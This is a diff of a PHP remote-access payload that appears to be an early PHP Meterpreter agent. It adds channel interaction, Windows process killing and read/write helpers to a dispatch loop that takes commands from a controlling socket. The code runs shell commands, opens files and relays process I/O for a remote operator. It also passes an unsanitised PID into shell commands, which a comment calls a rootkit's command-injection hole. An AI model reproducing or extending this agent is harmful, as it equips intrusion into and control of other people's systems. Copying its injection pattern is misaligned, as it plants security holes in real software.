@@ -1,4 +1,7 @@
-#<?php # This line lets us run as a standalone file or as eval'd code
+//<?php
+# The previous line lets us run as a standalone file or as eval'd code.  We use
+# a // for the comment instead of # so that the comment remover doesn't blow it
+# away.
 
 function my_print($str) {
     #error_log($str);
@@ -312,6 +315,17 @@ function is_windows() {
 # Wrap everything in checks for existence of the new functions in case we get
 # eval'd twice
 #my_print("Evaling stdapi");
+
+# Need to nail down what this should actually do.  In ruby, it doesn't expand
+# environment variables but in the windows meterpreter it does
+if (!function_exists('stdapi_fs_expand_path')) {
+function stdapi_fs_expand_path($req, &$pkt) {
+    my_print("doing expand_path");
+    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
+    return ERROR_FAILURE;
+}
+}
+
 # works
 if (!function_exists('stdapi_fs_chdir')) {
 function stdapi_fs_chdir($req, &$pkt) {
@@ -350,7 +364,6 @@ function stdapi_fs_ls($req, &$pkt) {
     $dir_handle = @opendir($path);
 
     if ($dir_handle) {
-        #my_print("Doing an ls");
         while ($file = readdir($dir_handle)) {
             if ($file != "." && $file != "..") {
                 #my_print("Adding file $file");
@@ -481,7 +494,7 @@ function stdapi_sys_process_execute($req, &$pkt) {
     if (0 > strlen($cmd)) {
         return ERROR_FAILURE;
     }
-    my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")");
+    #my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")");
     if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
         global $processes, $channels;
         my_print("Channelized");
@@ -489,8 +502,14 @@ function stdapi_sys_process_execute($req, &$pkt) {
         if ($handle === false) {
             return ERROR_FAILURE;
         }
+        $pipes['type'] = 'stream';
+        register_stream($pipes[0]);
+        register_stream($pipes[1]);
+        register_stream($pipes[2]);
+
         $processes[] = $handle;
         $channels[] = $pipes;
+
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, 0));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)-1));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, count($channels)-1));
@@ -525,7 +544,7 @@ function stdapi_sys_process_get_processes($req, &$pkt) {
             $pieces = preg_split('/","/', $line);
             # Strip off the initial quote on the first and last elements
             $pieces[0] = substr($pieces[0], 1, strlen($pieces[0]));
-            $cnt = count($pieces);
+            $cnt = count($pieces) - 1;
             $pieces[$cnt] = substr($pieces[$cnt], 1, strlen($pieces[$cnt]));
 
             $proc_info = array($pieces[1], $pieces[6], $pieces[0]);
@@ -580,11 +599,15 @@ function stdapi_sys_process_kill($req, &$pkt) {
             my_print(posix_strerror($ret));
         }
     } else {
-        # every rootkit should have command injection vulnerabilities
-        if ("foo" == my_cmd("kill -9 $pid && echo foo")) {
+        $ret = ERROR_FAILURE;
+        if (is_windows()) {
+            my_cmd("taskkill /f /pid $pid");
+            # Don't know how to check for success yet, so just assume it worked
             $ret = ERROR_SUCCESS;
         } else {
-            $ret = ERROR_FAILURE;
+            if ("foo" == my_cmd("kill -9 $pid && echo foo")) {
+                $ret = ERROR_SUCCESS;
+            }
         }
     }
     return $ret;
@@ -623,7 +646,7 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
     global $channels;
     $fpath_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
     $mode_tlv = packet_get_tlv($req, TLV_TYPE_FILE_MODE);
-    my_print("Opening path {$fpath_tlv['value']} with mode {$mode_tlv['value']}");
+    #my_print("Opening path {$fpath_tlv['value']} with mode {$mode_tlv['value']}");
     if (!$mode_tlv) {
         $mode_tlv = array('value' => 'rb');
     }
@@ -633,7 +656,7 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
         register_stream($fd);
         array_push($channels, array(0 => $fd, 1 => $fd, 'type' => 'stream'));
         $id = count($channels) - 1;
-        my_print("Created new channel $fd, with id $id");
+        my_print("Created new file channel $fd, with id $id");
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
         return ERROR_SUCCESS;
     } else {
@@ -697,12 +720,12 @@ function core_channel_open($req, &$pkt) {
         $ret = $handler($req, $pkt);
     } else {
         my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =(");
-        #$ret = channel_create_generic($req, $pkt);
         $ret = ERROR_FAILURE;
     }
 
     return $ret;
 }
+
 function core_channel_eof($req, &$pkt) {
     my_print("doing channel eof");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
@@ -721,7 +744,6 @@ function core_channel_eof($req, &$pkt) {
 }
 
 # Works for streams that work with fread
-# TODO: Genericize me
 function core_channel_read($req, &$pkt) {
     my_print("doing channel read");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
@@ -739,7 +761,6 @@ function core_channel_read($req, &$pkt) {
 }
 
 # Works for streams that work with fwrite
-# TODO: Genericize me
 function core_channel_write($req, &$pkt) {
     my_print("doing channel write");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
@@ -768,15 +789,51 @@ function core_channel_close($req, &$pkt) {
     if ($c) {
         # We found a channel, close its stdin/stdout/stderr
         for($i = 0; $i < 3; $i++) {
-            my_print("closing channel fd $i, {$c[$i]}");
+            #my_print("closing channel fd $i, {$c[$i]}");
             if (array_key_exists($i, $c) && is_resource($c[$i])) {
-                fclose($c[$i]);
+                close($c[$i]);
             }
         }
         return ERROR_SUCCESS;
     }
 
     return ERROR_FAILURE;
+}
+
+function core_channel_interact($req, &$pkt) {
+    global $readers;
+
+    my_print("doing channel interact");
+    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
+    $id = $chan_tlv['value'];
+
+    # True means start interacting, False means stop
+    $toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL);
+
+    $c = get_channel_by_id($id);
+    if ($c) {
+        if ($toggle_tlv['value']) {
+            if (!in_array($c[1], $readers)) {
+                add_reader($c[1]);
+                $ret = ERROR_SUCCESS;
+            } else {
+                # Already interacting
+                $ret = ERROR_FAILURE;
+            }
+        } else {
+            if (in_array($c[1], $readers)) {
+                remove_reader($c[1]);
+                $ret = ERROR_SUCCESS;
+            } else {
+                # Not interacting
+                $ret = ERROR_FAILURE;
+            }
+        }
+    } else {
+        # Not a valid channel
+        $ret = ERROR_FAILURE;
+    }
+    return $ret;
 }
 
 # Libraries are sent as a zlib-compressed blob.  Unfortunately, zlib support is
@@ -800,11 +857,12 @@ function core_loadlib($req, &$pkt) {
 ##
 $channels = array();
 
-function get_channel_id_from_socket($sock) {
+function get_channel_id_from_resource($resource) {
     global $channels;
-    #my_print("looking for channel from sock $sock");
+    #my_print("Looking up channel from resource $resource");
     for ($i = 0; $i < count($channels); $i++) {
-        if ($channels[$i][0] == $sock) {
+        if (in_array($resource, $channels[$i])) {
+            #my_print("Found channel id $i");
             return $i;
         }
     }
@@ -813,7 +871,7 @@ function get_channel_id_from_socket($sock) {
 
 function get_channel_by_id($chan_id) {
     global $channels;
-    my_print("looking for channel $chan_id");
+    #my_print("Looking up channel id $chan_id");
     if (array_key_exists($chan_id, $channels)) {
         return $channels[$chan_id];
     } else {
@@ -824,11 +882,7 @@ function get_channel_by_id($chan_id) {
 function channel_write($chan_id, $data) {
     $c = get_channel_by_id($chan_id);
     if ($c && is_resource($c[0])) {
-        if ($c['type'] == 'socket') {
-            return socket_write($c[0], $data, strlen($data));
-        } else {
-            return fwrite($c[0], $data, strlen($data));
-        }
+        return write($c[0], $data);
     } else {
         return false;
     }
@@ -837,22 +891,7 @@ function channel_write($chan_id, $data) {
 function channel_read($chan_id, $len) {
     $c = get_channel_by_id($chan_id);
     if ($c && is_resource($c[1])) {
-        if ($c['type'] == 'socket') {
-            $result = socket_read($c[1], $len);
-        } else {
-            $result = fread($c[1], $len);
-        }
-        return $result;
-    } else {
-        return false;
-    }
-}
-
-# XXX Unimplemented
-function channel_interact($chan_id) {
-    $c = get_channel_by_id($chan_id);
-    if ($c) {
-        return false;
+        return read($c[1], $len);
     } else {
         return false;
     }
@@ -865,9 +904,10 @@ function channel_interact($chan_id) {
 # TLV Helper Functions
 ##
 
-function handle_dead_socket_channel($sock) {
-    $cid = get_channel_id_from_socket($sock);
-    my_print("Handling dead socket: {$sock}");
+function handle_dead_resource_channel($resource) {
+    $cid = get_channel_id_from_resource($resource);
+    my_print("Handling dead resource: {$resource}");
+    close($resource);
     $pkt = pack("N", PACKET_TYPE_REQUEST);
 
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
@@ -880,9 +920,9 @@ function handle_dead_socket_channel($sock) {
     $pkt = pack("N", strlen($pkt) + 4) . $pkt;
     return $pkt;
 }
-function handle_socket_read_channel($sock, $data) {
-    $cid = get_channel_id_from_socket($sock);
-    my_print("Handling socket data: {$data}");
+function handle_resource_read_channel($resource, $data) {
+    $cid = get_channel_id_from_resource($resource);
+    my_print("Handling data from $resource: {$data}");
     $pkt = pack("N", PACKET_TYPE_REQUEST);
 
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
@@ -902,7 +942,7 @@ function create_response($req) {
     $pkt = pack("N", PACKET_TYPE_RESPONSE);
 
     $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
-    my_print("method is {$method_tlv['value']}");
+    #my_print("method is {$method_tlv['value']}");
     packet_add_tlv($pkt, $method_tlv);
 
     $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
@@ -961,7 +1001,7 @@ function packet_add_tlv(&$pkt, $tlv) {
 }
 
 function packet_get_tlv($pkt, $type) {
-    my_print("Looking for a tlv of type $type");
+    #my_print("Looking for a tlv of type $type");
     # Start at offset 8 to skip past the packet header
     $offset = 8;
     while ($offset < strlen($pkt)) {
@@ -983,19 +1023,40 @@ function packet_get_tlv($pkt, $type) {
                 $tlv['value'] = substr($pkt, $offset+8, $tlv['len']-8);
             }
             else {
-                my_print("Wtf type is this? $type");
-                $tlv = NULL;
+                #my_print("Wtf type is this? $type");
+                $tlv = null;
             }
             return $tlv;
         }
         $offset += $tlv['len'];
     }
-    my_print("Didn't find one, wtf");
+    #my_print("Didn't find one, wtf");
     return false;
 }
 
 
 
+
+function add_reader($resource) {
+    global $readers;
+    my_print("-- Adding {$resource} to readers");
+    if (!in_array($resource, $readers)) {
+        array_push($readers, $resource);
+    }
+}
+
+function remove_reader($resource) {
+    global $readers;
+    if (in_array($resource, $readers)) {
+        my_print("-- Removing $resource from readers");
+        foreach ($readers as $key => $r) {
+            if ($r == $resource) {
+                unset($readers[$key]);
+                break;
+            }
+        }
+    }
+}
 
 $resource_type_map = array();
 function register_socket($sock) {
@@ -1010,55 +1071,66 @@ function register_stream($stream) {
     $resource_type_map[(int)$stream] = 'stream';
 }
 
+function dump_array($arr, $name=null) {
+    if (is_null($name)) {
+        my_print(sprintf("Array (%s)", count($arr)));
+    } else {
+        my_print(sprintf("$name (%s)", count($arr)));
+    }
+    foreach ($arr as $key => $val) {
+        $foo = sprintf("    $key ($val)");
+        my_print($foo);
+    }
+}
+function dump_readers() {
+    global $readers;
+    dump_array($readers, 'Readers');
+}
 function dump_resource_map() {
     global $resource_type_map;
-    my_print(sprintf("Resource map %s", count($resource_type_map)));
-    foreach ($resource_type_map as $resource => $type) {
-        my_print("    $resource ($type)");
-    }
+    dump_array($resource_type_map, 'Resource map');
 }
 
 function close($resource) {
+    my_print("Closing resource $resource");
+    global $readers, $resource_type_map;
+    remove_reader($resource);
     switch (get_rtype($resource)) {
-    case 'socket':
-        return socket_close($resource);
-        break;
-    case 'stream':
-        return fclose($resource);
-        break;
+    case 'socket': return socket_close($resource); break;
+    case 'stream': return fclose($resource); break;
+    }
+    # Every resource should be in the resource type map, but check anyway
+    if (array_key_exists((int)$resource, $resource_type_map)) {
+        my_print("Removing $resource from resource_type_map");
+        unset($resource_type_map[(int)$resource]);
     }
 }
 
-function read($resource, $len) {
+function read($resource, $len=null) {
+    # Max packet length is magic.  If we're reading a pipe that has data but
+    # isn't going to generate any more without some input, then reading less
+    # than all bytes in the buffer or 8192 bytes, the next read will never
+    # return.
+    if (is_null($len)) { $len = 8192; }
     my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
+    $buff = '';
     switch (get_rtype($resource)) {
-    case 'socket':
-        $buff = socket_read($resource, $len, PHP_BINARY_READ);
-        break;
-    case 'stream':
-        $buff = fread($resource, $len);
-        break;
-    default:
-        my_print("Wtf don't know how to read from resource $resource");
-        break;
+    case 'socket': $buff = socket_read($resource, $len, PHP_BINARY_READ); break;
+    case 'stream': $buff = fread($resource, $len); break;
+    default: my_print("Wtf don't know how to read from resource $resource"); break;
     }
+    my_print(sprintf("Read %d bytes", strlen($buff)));
     return $buff;
 }
 
 function write($resource, $buff, $len=0) {
     if ($len == 0) { $len = strlen($buff); }
-    my_print(sprintf("Writing %d bytes to $resource which is a %s", $len, get_rtype($resource)));
+    my_print(sprintf("Writing $len bytes to $resource which is a %s", get_rtype($resource)));
+    $count = false;
     switch (get_rtype($resource)) {
-    case 'socket':
-        $count = socket_write($resource, $buff, $len);
-        break;
-    case 'stream':
-        $count = fwrite($resource, $buff, $len);
-        break;
-    default:
-        my_print("Wtf don't know how to write to resource $resource");
-        $count = FALSE;
-        break;
+    case 'socket': $count = socket_write($resource, $buff, $len); break;
+    case 'stream': $count = fwrite($resource, $buff, $len); break;
+    default: my_print("Wtf don't know how to write to resource $resource"); break;
     }
     my_print("Wrote $count bytes");
     return $count;
@@ -1066,7 +1138,10 @@ function write($resource, $buff, $len=0) {
 
 function get_rtype($resource) {
     global $resource_type_map;
-    return $resource_type_map[(int)$resource];
+    if (array_key_exists((int)$resource, $resource_type_map)) {
+        return $resource_type_map[(int)$resource];
+    }
+    return false;
 }
 
 function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
@@ -1115,17 +1190,17 @@ function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
 
     # Workaround for some versions of PHP that throw an error and bail out if
     # select is given an empty array
-    if (count($sockets_r)==0) { $sockets_r = NULL; }
-    if (count($sockets_w)==0) { $sockets_w = NULL; }
-    if (count($sockets_e)==0) { $sockets_e = NULL; }
-    if (count($streams_r)==0) { $streams_r = NULL; }
-    if (count($streams_w)==0) { $streams_w = NULL; }
-    if (count($streams_e)==0) { $streams_e = NULL; }
+    if (count($sockets_r)==0) { $sockets_r = null; }
+    if (count($sockets_w)==0) { $sockets_w = null; }
+    if (count($sockets_e)==0) { $sockets_e = null; }
+    if (count($streams_r)==0) { $streams_r = null; }
+    if (count($streams_w)==0) { $streams_w = null; }
+    if (count($streams_e)==0) { $streams_e = null; }
 
     $count = 0;
     if ($n_sockets > 0) {
         $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec);
-        if (FALSE === $res) { return FALSE; }
+        if (false === $res) { return false; }
         if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r); }
         if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w); }
         if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e); }
@@ -1133,7 +1208,7 @@ function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
     }
     if ($n_streams > 0) {
         $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec);
-        if (FALSE === $res) { return FALSE; }
+        if (false === $res) { return false; }
         if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r); }
         if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w); }
         if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); }
@@ -1208,22 +1283,22 @@ if ($listen) {
 
 
 $readers = array($msgsock);
-$file_readers = array();
 
 #
 # Main dispatch loop
 #
-while (FALSE !== select($r=$readers, $w=NULL, $e=NULL, 1)) {
-    dump_resource_map();
+$r=$readers;
+while (false !== ($cnt = select($r, $w=null, $e=null, 1))) {
+    dump_array($r);
     my_print(sprintf("Returned from select with %s readers", count($r)));
     $read_failed = false;
-    for ($i = 0; $i < count($r); $i++) {
+    for ($i = 0; $i < $cnt; $i++) {
         $ready = $r[$i];
         if ($ready == $msgsock) {
             $request = read($msgsock, 8);
-            my_print(sprintf("Read returned %s bytes", strlen($request)));
-            if (FALSE==$request) {
-                my_print("Read failed on main socket, bailing");
+            #my_print(sprintf("Read returned %s bytes", strlen($request)));
+            if (false==$request) {
+                #my_print("Read failed on main socket, bailing");
                 # We failed on the main socket.  There's no way to continue, so
                 # break all the way out.
                 break 2;
@@ -1235,26 +1310,29 @@ while (FALSE !== select($r=$readers, $w=NULL, $e=NULL, 1)) {
             $ptype = $a['type'];
             while (strlen($request) < $a['len']) {
                 $request .= read($msgsock, $len-strlen($request));
-                my_print(sprintf("Read more into request buff, now %s bytes", strlen($request)));
             }
-            #hexdump(substr($request, 0, $len));
-            my_print("creating response");
+            #my_print("creating response");
             $response = create_response($request);
 
             write($msgsock, $response);
         } else {
             my_print("not Msgsock: $ready");
-            $data = read($ready, 1024);
-            if (FALSE === $data || "" === $data) {
-                $request = handle_dead_socket_channel($ready);
+            $data = read($ready);
+            my_print(sprintf("Read returned %s bytes", strlen($data)));
+            if (false === $data || strlen($data) == 0) {
+                $request = handle_dead_resource_channel($ready);
                 write($msgsock, $request);
-                unset($readers[$i]);
+                remove_reader($ready);
             } else {
-                $request = handle_socket_read_channel($ready, $data);
+                $request = handle_resource_read_channel($ready, $data);
+                my_print("Got some data from a channel that needs to be passed back to the msgsock");
                 write($msgsock, $request);
             }
         }
     }
-}
+    dump_readers();
+    dump_resource_map();
+    $r=$readers;
+} # end main loop
 my_print("Finished");
 close($msgsock);
